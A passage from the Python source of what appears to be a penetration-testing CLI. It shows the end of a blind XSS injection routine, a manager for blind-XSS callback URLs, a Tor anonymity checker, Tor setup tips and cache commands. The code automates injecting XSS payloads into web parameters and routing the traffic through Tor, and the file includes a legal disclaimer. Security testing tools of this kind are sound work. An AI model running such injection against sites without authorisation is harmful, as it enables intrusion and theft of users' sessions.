                            test_url if method.upper() == "GET" else url,
                            param,
                            payload,
                            reflected=False,  # Blind XSS is not reflected immediately
                            vulnerable=True,  # Assume vulnerable if injected successfully
                            method=method,
                            response_code=response.status_code,
                            tool_used="blind_test",
                            severity="medium",  # Blind XSS is usually medium risk
                            notes=f"Blind XSS payload injected. Callback: {callback_url or 'Generic'}",
                        )
                    else:
                        print(f"[!] Server error: HTTP {response.status_code}")

                except Exception as e:
                    print(f"[!] Error injecting payload: {e}")

                time.sleep(delay)

    except Exception as e:
        print(f"[!] Error during blind XSS testing: {e}")

    print(f"\n[*] Blind XSS testing completed.")
    print(f"[*] Successfully injected {len(injected_payloads)} payloads")
    print("[*] Check your callback service for blind XSS triggers")

    if callback_url:
        print(f"[*] Monitor: {callback_url}")
    if email:
        print(f"[*] Check email: {email}")

    # Show tips
    print("\n[!] BLIND XSS TESTING TIPS:")
    print("   - Use XSS Hunter (xsshunter.com) for advanced blind XSS detection")
    print("   - Try Burp Collaborator for callback URLs")
    print("   - Check your callback service after 5-10 minutes")
    print("   - Some blind XSS may trigger hours or days later")
    print(
        "   - Test in different user contexts (admin panels, email notifications, etc.)"
    )


@cli.command()
@click.option("--url", help="Add callback URL")
@click.option("--list", "list_urls", is_flag=True, help="List stored callback URLs")
@click.option("--remove", help="Remove callback URL by ID")
@click.option("--test", help="Test callback URL connectivity")
def blind_callback(url, list_urls, remove, test):
    """Manage blind XSS callback URLs."""

    # Use fallback database for callback URLs storage
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Create callback URLs table if not exists
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS blind_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            description TEXT,
            active INTEGER DEFAULT 1,
            added_date TEXT,
            last_used TEXT,
            times_used INTEGER DEFAULT 0
        )
    """
    )

    if url:
        # Add new callback URL
        timestamp = datetime.now().isoformat()
        c.execute(
            """
            INSERT INTO blind_callbacks (url, added_date)
            VALUES (?, ?)
        """,
            (url, timestamp),
        )
        conn.commit()
        print(f"[+] Added callback URL: {url}")

    elif list_urls:
        # List all callback URLs
        c.execute("SELECT * FROM blind_callbacks ORDER BY added_date DESC")
        callbacks = c.fetchall()

        if callbacks:
            print("[*] Stored blind XSS callback URLs:")
            print("-" * 80)
            for cb in callbacks:
                status = "Active" if cb[3] else "Inactive"
                print(f"ID: {cb[0]} | {status}")
                print(f"URL: {cb[1]}")
                if cb[2]:  # description
                    print(f"Description: {cb[2]}")
                print(f"Added: {cb[4]} | Used: {cb[6]} times")
                if cb[5]:  # last_used
                    print(f"Last used: {cb[5]}")
                print("-" * 80)
        else:
            print("[*] No callback URLs stored")

    elif remove:
        # Remove callback URL
        c.execute("DELETE FROM blind_callbacks WHERE id = ?", (remove,))
        if c.rowcount > 0:
            conn.commit()
            print(f"[+] Removed callback URL ID: {remove}")
        else:
            print(f"[!] No callback URL found with ID: {remove}")

    elif test:
        # Test callback URL connectivity
        print(f"[*] Testing callback URL: {test}")
        try:
            with httpx.Client(timeout=10) as client:
                test_data = {
                    "test": "blind_xss_connectivity_check",
                    "timestamp": datetime.now().isoformat(),
                    "source": "xsscli_blind_test",
                }

                # Try GET request
                response = client.get(f"{test}?test=connectivity_check")
                print(f"[+] GET test: HTTP {response.status_code}")

                # Try POST request
                response = client.post(test, json=test_data)
                print(f"[+] POST test: HTTP {response.status_code}")

                print("[+] Callback URL appears to be reachable")

        except Exception as e:
            print(f"[!] Error testing callback URL: {e}")

    else:
        # Show usage
        print("[*] Blind XSS Callback Management")
        print("Usage examples:")
        print("  --url https://your-callback.com/xss    # Add callback URL")
        print("  --list                                  # List all callbacks")
        print("  --remove 1                              # Remove callback by ID")
        print("  --test https://callback.com/test        # Test connectivity")
        print("\n[*] Popular blind XSS services:")
        print("  - XSS Hunter: https://xsshunter.com")
        print("  - Burp Collaborator: Built into Burp Suite")
        print("  - Canarytokens: https://canarytokens.org")
        print("  - RequestBin: https://requestbin.net")
        print("  - Webhook.site: https://webhook.site")

    conn.close()


@cli.command()
@click.option(
    "--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL to test"
)
def tor_check(tor_proxy):
    """Check Tor proxy connectivity and anonymity."""
    print(f"[*] Testing Tor proxy: {tor_proxy}")

    # Test without Tor first
    try:
        print(f"[*] Getting current IP without Tor...")
        with httpx.Client(timeout=10) as client:
            response = client.get("https://httpbin.org/ip")
            if response.status_code == 200:
                real_ip = response.json().get("origin", "unknown")
                print(f"[*] Real IP: {real_ip}")
            else:
                print(f"[!] Could not get real IP")
                real_ip = None
    except Exception as e:
        print(f"[!] Error getting real IP: {e}")
        real_ip = None

    # Test with Tor
    try:
        print(f"[*] Testing connection through Tor...")
        tor_client = setup_tor_proxy(tor_proxy)

        if tor_client:
            with tor_client:
                # Test IP change
                response = tor_client.get("https://httpbin.org/ip", timeout=15)
                if response.status_code == 200:
                    tor_ip = response.json().get("origin", "unknown")
                    print(f"[+] Tor IP: {tor_ip}")

                    if real_ip and tor_ip != real_ip:
                        print(f"[+] ✅ IP successfully changed through Tor!")
                    else:
                        print(f"[!] ⚠️  Warning: IP may not have changed")

                # Test Tor verification
                try:
                    response = tor_client.get(
                        "https://check.torproject.org/api/ip", timeout=15
                    )
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("IsTor", False):
                            print(f"[+] ✅ Tor connection verified by torproject.org")
                            print(f"[+] Exit node IP: {data.get('IP', 'unknown')}")
                        else:
                            print(f"[!] ❌ Not using Tor according to torproject.org")
                    else:
                        print(f"[!] Could not verify with torproject.org")
                except Exception as e:
                    print(f"[!] Tor verification failed: {e}")

                # Test DNS leak
                try:
                    response = tor_client.get(
                        "https://1.1.1.1/cdn-cgi/trace", timeout=10
                    )
                    if response.status_code == 200:
                        trace_data = response.text
                        if "ip=" in trace_data:
                            dns_ip = trace_data.split("ip=")[1].split("\n")[0]
                            print(f"[*] DNS resolver sees IP: {dns_ip}")
                except Exception as e:
                    print(f"[!] DNS leak test failed: {e}")
        else:
            print(f"[!] ❌ Failed to establish Tor connection")

    except Exception as e:
        print(f"[!] Error testing Tor: {e}")

    print(f"\n[*] Tor connectivity test completed")


@cli.command()
def tor_setup():
    """Show Tor setup instructions."""
    print(
        """
[*] Tor Setup Guide for XSS CLI
================================

1. Install Tor:
   Ubuntu/Debian: sudo apt install tor
   CentOS/RHEL: sudo yum install tor
   macOS: brew install tor
   Windows: Download from https://www.torproject.org/

2. Start Tor service:
   Linux: sudo systemctl start tor
   macOS: brew services start tor
   Windows: Run Tor Browser or Tor Expert Bundle

3. Verify Tor is running:
   - Default SOCKS proxy: 127.0.0.1:9050
   - Check with: netstat -tlnp | grep 9050

4. Test with xsscli:
   reconcli xsscli tor-check
   reconcli xsscli test-input --input urls.txt --tor
   reconcli xsscli manual-test --url https://example.com --tor

5. Security Tips:
   - Use --delay to avoid rate limiting
   - Rotate circuits: sudo systemctl reload tor
   - Monitor logs: tail -f /var/log/tor/log
   - Never use Tor for illegal activities

6. Tor Configuration (/etc/tor/torrc):
   # Increase circuit build timeout
   CircuitBuildTimeout 30
   
   # Use specific exit nodes (optional)
   ExitNodes {us},{ca},{gb}
   
   # Avoid certain countries
   ExcludeExitNodes {cn},{ru},{ir}

7. Advanced Options:
   --tor-proxy socks5://127.0.0.1:9050    # Default
   --tor-proxy socks5://proxy.tor.net:9050 # Custom proxy
   
[!] LEGAL DISCLAIMER:
   - Use Tor responsibly and legally
   - Respect website terms of service
   - Obtain proper authorization before testing
   - Some countries restrict Tor usage
"""
    )


# Cache management commands at CLI level for easier access
@cli.command()
@click.option("--cache-dir", default="xss_cache", help="Cache directory to check")
def cache_stats(cache_dir):
    """Show XSS cache performance statistics."""
    cache_manager = XSSCacheManager(cache_dir=cache_dir)
    stats = cache_manager.get_cache_stats()

    click.secho("\n📊 XSS Cache Statistics:", fg="cyan", bold=True)
    click.secho(f"  • Total requests: {stats['total_requests']}", fg="blue")
    click.secho(f"  • Cache hits: {stats['cache_hits']}", fg="green")
    click.secho(f"  • Cache misses: {stats['cache_misses']}", fg="yellow")
    click.secho(f"  • Hit rate: {stats['hit_rate']}%", fg="blue")
    click.secho(f"  • Cached results: {stats['cached_results']}", fg="blue")
    click.secho(f"  • Cache size: {stats['cache_size_mb']:.2f} MB", fg="blue")
    click.secho(f"  • Cache directory: {stats['cache_dir']}", fg="blue")

    if stats["cache_hits"] > 0:
        improvement = stats["cache_hits"] * 20  # Estimate 20x improvement
        click.secho(
            f"  🚀 Estimated speed improvement: ~{improvement}x faster", fg="green"
        )


@cli.command()
@click.option("--cache-dir", default="xss_cache", help="Cache directory to clear")
def clear_cache(cache_dir):
    """Clear all XSS cached test results."""
    cache_manager = XSSCacheManager(cache_dir=cache_dir)
    removed = cache_manager.clear_cache()
    click.secho(f"✅ Cleared {removed} cached XSS test results", fg="green")


@cli.command()
@click.option("--cache-dir", default="xss_cache", help="Cache directory to clean")
def cleanup_cache(cache_dir):
    """Remove expired XSS cache entries."""
    cache_manager = XSSCacheManager(cache_dir=cache_dir)
    removed = cache_manager.cleanup_expired_cache()
    if removed > 0:
        click.secho(f"🧹 Cleaned up {removed} expired cache entries", fg="green")
    else:
        click.secho("✅ No expired cache entries found", fg="blue")


if __name__ == "__main__":
    cli()
